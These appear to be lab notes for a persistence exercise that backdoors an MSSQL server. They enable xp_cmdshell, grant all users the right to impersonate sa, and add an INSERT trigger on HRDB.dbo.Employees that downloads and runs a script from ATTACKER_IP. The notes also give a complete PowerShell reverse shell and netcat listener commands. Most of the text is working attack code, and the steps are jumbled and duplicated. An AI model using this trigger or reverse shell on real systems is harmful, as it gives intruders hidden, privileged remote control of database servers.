# xp\_cmd\_shell

```
CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees 
FOR INSERT AS

EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
```

* Simply put, triggers in MSSQL allow you to bind actions to be performed when specific events occur in the database. Those events can range from a user logging in up to data being inserted, updated or deleted from a given table. For this task, we will create a trigger for any `INSERT` into the `HRDB` database.

```
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO

sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO
```

* After this, we must ensure that any website accessing the database can run `xp_cmdshell`.
* By default, only database users with the `sysadmin role` will be able to do so.
* Since it is expected that web applications use a restricted database user, we can grant privileges to all users to impersonate the `sa user`, which is the default database administrator:
* Before creating the trigger, we must first reconfigure a few things on the database.
* First, we need to enable the `xp_cmdshell` stored procedure. `xp_cmdshell` is a stored procedure that is provided by default in any MSSQL installation and allows you to run commands directly in the system's console but comes **disabled by default.**
* To enable it, let's open `Microsoft SQL Server Management Studio 18`, available from the start menu.
* By default, the local Administrator account will have access to all DBs.
* Once logged in, click on the New Query button to open the query editor:
* Run the following SQL sentences to enable the "`Advanced Options`" in the MSSQL configuration, and proceed to enable `xp_cmdshell`.
* Now that the backdoor is set up, let's create `evilscript.ps1` in our attacker's machine, which will contain a Powershell reverse shell:

```
USE master

GRANT IMPERSONATE ON LOGIN::sa to [Public];
```

* After all of this, we finally configure a trigger. We start by changing to the `HRDB` database:

```
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);

$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};

$client.Close()
```

* We will need to open two terminals to handle the connections involved in this exploit:

```
USE HRDB
```

* Our trigger will leverage `xp_cmdshell` to execute `Powershell` to download and run a `.ps1` file from a web server controlled by the attacker. The trigger will be configured to execute whenever an `INSERT` is made into the `Employees table` of the `HRDB database`:

```
CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees 
FOR INSERT AS

EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
```

* Now that the backdoor is set up, let's create `evilscript.ps1` in our attacker's machine, which will contain a Powershell reverse shell:

```
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);

$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};

$client.Close()
```

* We will need to open two terminals to handle the connections involved in this exploit:
* The trigger will perform the first connection to download and execute `evilscript.ps1`. Our trigger is using port `8000` for that.
* The second connection will be a reverse shell on port `4454` back to our attacker machine.

```
# AttackBox
python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 
 	
# AttackBox
nc -lvp 4454
Listening on 0.0.0.0 4454
```

* With all that ready, let's navigate to `http://MACHINE_IP/` and `insert` an employee into the web application.
* Since the web application will send an `INSERT` statement to the database, our `TRIGGER` will provide us access to the system's console.
